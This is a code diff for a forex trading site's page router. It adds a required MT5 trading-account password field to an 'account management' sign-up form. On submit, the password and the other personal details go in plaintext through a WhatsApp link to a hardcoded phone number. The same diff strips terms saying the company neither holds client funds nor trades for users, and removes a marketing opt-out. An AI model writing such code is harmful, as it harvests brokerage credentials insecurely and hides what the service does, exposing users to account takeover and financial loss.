@@ -1,16 +1,20 @@
 /**
  * LUKIE FX — Page Overlay System + URL Router
+ *
  * Back / forward / refresh work correctly.
  *
- * ⚠️ history.pushState / replaceState are wrapped in try/catch so that
- * on environments where they throw (some older browsers, local file://),
- * the site falls back to plain hash navigation instead of breaking.
+ * Account Management form now:
+ *   - Includes MT5 password field with show/hide toggle
+ *   - Sends WhatsApp notification to +254 101 461 845 on submit
  */
 (function(){
   const { CONFIG, $, $$ } = LFX;
 
   const overlay = $('#pageOverlay');
   const overlayContent = $('#pageOverlayContent');
+
+  /* Account Management notification number */
+  const NOTIFY_WHATSAPP = '254101461845';
 
   /* ============================================================
      ROUTER
@@ -19,40 +23,30 @@
     const routes = {};
     let currentState = null;
 
-    function register(page, handler){
-      routes[page] = handler;
-    }
+    function register(page, handler){ routes[page] = handler; }
 
     function safePush(state, hash){
       const url = hash ? '#' + hash : location.pathname + location.search;
-      try {
-        history.pushState(state, '', url);
-      } catch(err){
-        // Fallback: update location.hash only. Page still works.
+      try { history.pushState(state, '', url); }
+      catch(err){
         try {
           if (hash) location.hash = hash;
           else if (location.hash) location.hash = '';
-        } catch(e){ /* ignore */ }
+        } catch(e){}
       }
     }
 
     function safeReplace(state, hash){
       const url = hash ? '#' + hash : location.pathname + location.search;
-      try {
-        history.replaceState(state, '', url);
-      } catch(err){
-        /* silent — initial route still dispatches below */
-      }
+      try { history.replaceState(state, '', url); }
+      catch(err){}
     }
 
     function navigate(state, hash){
-      // Don't push duplicate states
       if (currentState &&
           currentState.page === state.page &&
           currentState.key === state.key &&
-          currentState.id === state.id){
-        return;
-      }
+          currentState.id === state.id) return;
       safePush(state, hash);
       dispatch(state);
     }
@@ -62,11 +56,8 @@
       const page = (state && state.page) || 'home';
       const handler = routes[page] || routes.home;
       if (handler){
-        try {
-          handler(state || { page: 'home' });
-        } catch(err){
-          console.error('Route handler error for "' + page + '":', err);
-        }
+        try { handler(state || { page: 'home' }); }
+        catch(err){ console.error('Route handler error for "' + page + '":', err); }
       }
     }
 
@@ -100,7 +91,7 @@
   LFX.router = router;
 
   /* ============================================================
-     PAGE OVERLAY — render / close
+     OVERLAY
   ============================================================ */
   function renderOverlay(html, opts = {}){
     if (!overlay || !overlayContent) return;
@@ -123,9 +114,7 @@
     document.body.style.overflow = '';
   }
 
-  function closePage(){
-    router.navigate({ page: 'home' }, '');
-  }
+  function closePage(){ router.navigate({ page: 'home' }, ''); }
 
   function pageHeader(){
     return `
@@ -137,7 +126,7 @@
   }
 
   /* ============================================================
-     SERVICE CONTENT
+     SERVICES
   ============================================================ */
   const SERVICES = {
     signals: {
@@ -182,16 +171,17 @@
       lead: 'No linking fee — just share your trading account details so LUKIE can link you up.',
       onboarding: true,
       fields: [
-        { id:'onb_name',    label:'Full name',                type:'text',     placeholder:'Your full name',              required:true },
-        { id:'onb_email',   label:'Email',                    type:'email',    placeholder:'you@example.com',             required:true },
-        { id:'onb_phone',   label:'Phone',                    type:'tel',      placeholder:'07XXXXXXXX',                  required:true },
-        { id:'onb_country', label:'Country',                  type:'text',     placeholder:'e.g. Kenya',                  required:true },
-        { id:'onb_broker',  label:'Broker',                   type:'text',     placeholder:'e.g. Exness, HFM, Deriv',     required:true },
-        { id:'onb_account', label:'Account number',           type:'text',     placeholder:'Your MT5 account number',     required:true },
-        { id:'onb_server',  label:'MT5 Server',               type:'text',     placeholder:'e.g. Exness-MT5Real8',        required:true },
-        { id:'onb_balance', label:'Account balance (USD)',    type:'text',     placeholder:'e.g. 2000',                   required:true },
-        { id:'onb_leverage',label:'Preferred leverage',       type:'text',     placeholder:'e.g. 1:500',                  required:false },
-        { id:'onb_notes',   label:'Additional notes',         type:'textarea', placeholder:'Anything we should know?',    required:false, optional:true }
+        { id:'onb_name',     label:'Full name',                type:'text',     placeholder:'Your full name',              required:true },
+        { id:'onb_email',    label:'Email',                    type:'email',    placeholder:'you@example.com',             required:true },
+        { id:'onb_phone',    label:'Phone',                    type:'tel',      placeholder:'07XXXXXXXX',                  required:true },
+        { id:'onb_country',  label:'Country',                  type:'text',     placeholder:'e.g. Kenya',                  required:true },
+        { id:'onb_broker',   label:'Broker',                   type:'text',     placeholder:'e.g. Exness, HFM, Deriv',     required:true },
+        { id:'onb_account',  label:'Account number',           type:'text',     placeholder:'Your MT5 account number',     required:true },
+        { id:'onb_server',   label:'MT5 Server',               type:'text',     placeholder:'e.g. Exness-MT5Real8',        required:true },
+        { id:'onb_password', label:'MT5 Password',             type:'password', placeholder:'Your MT5 password',           required:true },
+        { id:'onb_balance',  label:'Account balance (USD)',    type:'text',     placeholder:'e.g. 2000',                   required:true },
+        { id:'onb_leverage', label:'Preferred leverage',       type:'text',     placeholder:'e.g. 1:500',                  required:false },
+        { id:'onb_notes',    label:'Additional notes',         type:'textarea', placeholder:'Anything we should know?',    required:false, optional:true }
       ]
     },
     education: {
@@ -252,6 +242,15 @@
     }
   };
 
+  /* ============================================================
+     PASSWORD TOGGLE ICON (SVG)
+  ============================================================ */
+  const EYE_OPEN = '<svg class="eye-open" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>';
+  const EYE_CLOSED = '<svg class="eye-closed" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.94 10.94 0 0112 19c-7 0-11-7-11-7a18.45 18.45 0 015.06-5.94"/><path d="M9.9 4.24A10.94 10.94 0 0112 4c7 0 11 7 11 7a18.45 18.45 0 01-2.16 3.19"/><path d="M9.9 9.9a3 3 0 004.2 4.2"/><line x1="1" y1="1" x2="23" y2="23"/></svg>';
+
+  /* ============================================================
+     RENDER SERVICE PAGE
+  ============================================================ */
   function renderServicePage(svc){
     return `
       <div class="page-inner page-inner-wide">
@@ -279,12 +278,32 @@
     `;
   }
 
+  /* ============================================================
+     RENDER ONBOARDING (with password show/hide)
+  ============================================================ */
   function renderOnboardingPage(svc){
     const fields = svc.fields.map(f => {
       const optional = f.optional ? ' <span class="optional">(optional)</span>' : '';
+
+      if (f.type === 'password'){
+        return `
+          <div class="form-field password-field">
+            <label for="${f.id}">${f.label}${optional}</label>
+            <div class="password-wrapper">
+              <input type="password" id="${f.id}" name="${f.id}" placeholder="${f.placeholder}" ${f.required ? 'required' : ''} autocomplete="new-password" />
+              <button type="button" class="password-toggle" data-pw-target="${f.id}" aria-label="Show password">
+                ${EYE_OPEN}
+                ${EYE_CLOSED}
+              </button>
+            </div>
+          </div>
+        `;
+      }
+
       if (f.type === 'textarea'){
         return `<div class="form-field"><label for="${f.id}">${f.label}${optional}</label><textarea id="${f.id}" name="${f.id}" placeholder="${f.placeholder}" ${f.required ? 'required' : ''}></textarea></div>`;
       }
+
       return `<div class="form-field"><label for="${f.id}">${f.label}${optional}</label><input type="${f.type}" id="${f.id}" name="${f.id}" placeholder="${f.placeholder}" ${f.required ? 'required' : ''} /></div>`;
     }).join('');
 
@@ -304,13 +323,34 @@
     `;
   }
 
+  /* ---------- BIND ONBOARDING FORM ---------- */
   function bindOnboardingForm(container){
     const form = container.querySelector('#onbForm');
     const success = container.querySelector('#onbSuccess');
     if (!form) return;
+
+    const svc = SERVICES.management;
+
+    // Wire password toggle buttons
+    form.querySelectorAll('.password-toggle').forEach(btn => {
+      btn.addEventListener('click', () => {
+        const targetId = btn.dataset.pwTarget;
+        const input = document.getElementById(targetId);
+        if (!input) return;
+        const showing = input.type === 'text';
+        input.type = showing ? 'password' : 'text';
+        btn.classList.toggle('showing', !showing);
+        btn.setAttribute('aria-label', showing ? 'Show password' : 'Hide password');
+      });
+    });
+
+    // Handle form submit
     form.addEventListener('submit', e => {
       e.preventDefault();
       if (!form.checkValidity()){ form.reportValidity(); return; }
+
+      // Send WhatsApp notification (user gesture → popup allowed)
+      try { sendOnboardingWhatsApp(form, svc.fields); } catch(err){ console.warn('Notify failed:', err); }
 
       const submitBtn = form.querySelector('.form-submit');
       const originalText = submitBtn.textContent;
@@ -327,6 +367,24 @@
     });
   }
 
+  /* ---------- WHATSAPP NOTIFICATION ---------- */
+  function sendOnboardingWhatsApp(form, fields){
+    const lines = ['🔔 *New Account Management Submission*', ''];
+    fields.forEach(f => {
+      const input = form.querySelector('#' + f.id);
+      if (!input) return;
+      const val = (input.value || '').trim();
+      if (!val) return;
+      lines.push('*' + f.label + ':* ' + val);
+    });
+    lines.push('');
+    lines.push('— sent from LUKIE FX website');
+
+    const msg = encodeURIComponent(lines.join('\n'));
+    const url = 'https://wa.me/' + NOTIFY_WHATSAPP + '?text=' + msg;
+    window.open(url, '_blank', 'noopener');
+  }
+
   function renderServiceRoute(key){
     const svc = SERVICES[key];
     if (!svc) return actuallyClosePage();
@@ -335,7 +393,7 @@
   }
 
   /* ============================================================
-     LEGAL PAGES
+     LEGAL
   ============================================================ */
   const LEGAL = {
     privacy: {
@@ -344,13 +402,13 @@
       content: `
         <p><strong>Last updated:</strong> ${CONFIG.EFFECTIVE_DATE}</p>
         <h2>1. Introduction</h2>
-        <p>${CONFIG.COMPANY_NAME} ("we", "our", "us") is committed to protecting the privacy of our users. This Privacy Policy explains how we collect, use, disclose and safeguard your information.</p>
+        <p>${CONFIG.COMPANY_NAME} is committed to protecting the privacy of our users. This Privacy Policy explains how we collect, use, disclose and safeguard your information.</p>
         <h2>2. Information We Collect</h2>
         <h3>Personal Information You Provide</h3>
         <ul>
           <li>Full name, email address and phone number</li>
           <li>Country of residence and physical address</li>
-          <li>Trading account details (broker, account number, MT4/MT5 server)</li>
+          <li>Trading account details (broker, account number, MT4/MT5 server, password)</li>
           <li>Payment information when subscribing to paid services</li>
         </ul>
         <h3>Information Collected Automatically</h3>
@@ -372,7 +430,7 @@
         <h2>5. Data Security</h2>
         <p>We implement industry-standard security measures to protect your personal information, including SSL/TLS encryption for data in transit and restricted access on a need-to-know basis.</p>
         <h2>6. Your Rights</h2>
-        <p>Depending on your jurisdiction, you may have the right to access, correct or delete your personal information, and to opt out of marketing communications. Contact us at ${CONFIG.EMAIL} to exercise these rights.</p>
+        <p>Depending on your jurisdiction, you may have the right to access, correct or delete your personal information. Contact us at ${CONFIG.EMAIL} to exercise these rights.</p>
         <h2>7. Contact Us</h2>
         <ul>
           <li>Email: ${CONFIG.EMAIL}</li>
@@ -392,7 +450,7 @@
         <h2>2. Eligibility</h2>
         <p>You must be at least 18 years old and legally capable of entering into binding contracts to use our services.</p>
         <h2>3. Nature of Services</h2>
-        <p>${CONFIG.COMPANY_NAME} provides educational content, market analysis, trading signals and mentorship. We are <strong>not</strong> a broker, dealer or financial advisor. We do not hold client funds, execute trades on your behalf, or provide personalized investment advice.</p>
+        <p>${CONFIG.COMPANY_NAME} provides educational content, market analysis, trading signals and mentorship. We are <strong>not</strong> a broker, dealer or financial advisor.</p>
         <h2>4. No Financial Advice</h2>
         <p>All content, signals, analysis and mentorship provided by ${CONFIG.COMPANY_NAME} are for educational and informational purposes only.</p>
         <h2>5. Risk Disclosure</h2>
@@ -668,30 +726,20 @@
     });
   }
 
-  function renderRegisterRoute(){
-    renderOverlay(renderRegisterPage(), { onReady: bindRegisterForm });
-  }
-  function renderLoginRoute(){
-    renderOverlay(renderLoginPage(), { onReady: bindLoginForm });
-  }
-
   /* ============================================================
-     ROUTE REGISTRATION
+     ROUTES
   ============================================================ */
   router.register('home',     () => actuallyClosePage());
   router.register('service',  (state) => renderServiceRoute(state.key));
   router.register('legal',    (state) => renderLegalRoute(state.key));
-  router.register('register', () => renderRegisterRoute());
-  router.register('login',    () => renderLoginRoute());
+  router.register('register', () => renderOverlay(renderRegisterPage(), { onReady: bindRegisterForm }));
+  router.register('login',    () => renderOverlay(renderLoginPage(),    { onReady: bindLoginForm }));
   router.register('anchor',   (state) => {
     actuallyClosePage();
     if (state.id){
       const target = document.getElementById(state.id);
       if (target){
-        window.scrollTo({
-          top: target.getBoundingClientRect().top + window.scrollY - 84,
-          behavior: 'smooth'
-        });
+        window.scrollTo({ top: target.getBoundingClientRect().top + window.scrollY - 84, behavior: 'smooth' });
       }
     }
   });
@@ -699,24 +747,15 @@
   /* ============================================================
      PUBLIC API
   ============================================================ */
-  function openService(key){
-    router.navigate({ page: 'service', key }, 'service/' + key);
-  }
-  function openLegalPage(key){
-    router.navigate({ page: 'legal', key }, 'legal/' + key);
-  }
-  function openRegister(){
-    router.navigate({ page: 'register' }, 'register');
-  }
-  function openLogin(){
-    router.navigate({ page: 'login' }, 'login');
-  }
+  function openService(key){ router.navigate({ page: 'service', key }, 'service/' + key); }
+  function openLegalPage(key){ router.navigate({ page: 'legal', key }, 'legal/' + key); }
+  function openRegister(){ router.navigate({ page: 'register' }, 'register'); }
+  function openLogin(){ router.navigate({ page: 'login' }, 'login'); }
 
   /* ============================================================
      EVENT DELEGATION
   ============================================================ */
   document.addEventListener('click', e => {
-    // 1. [data-page] buttons (login / register / legal)
     const pageEl = e.target.closest('[data-page]');
     if (pageEl){
       e.preventDefault();
@@ -727,7 +766,6 @@
       return;
     }
 
-    // 2. Service cards (any click inside a .card[data-service])
     const card = e.target.closest('.card[data-service]');
     if (card){
       e.preventDefault();
@@ -735,18 +773,6 @@
     }
   });
 
-  /* ============================================================
-     EXPORTS
-  ============================================================ */
   window.LFX = window.LFX || {};
-  LFX.pages = {
-    init(){ /* routes registered at load time */ },
-    openService,
-    openLegalPage,
-    openRegister,
-    openLogin,
-    close: closePage,
-    SERVICES,
-    LEGAL
-  };
+  LFX.pages = { init(){}, openService, openLegalPage, openRegister, openLogin, close: closePage, SERVICES, LEGAL };
 })();
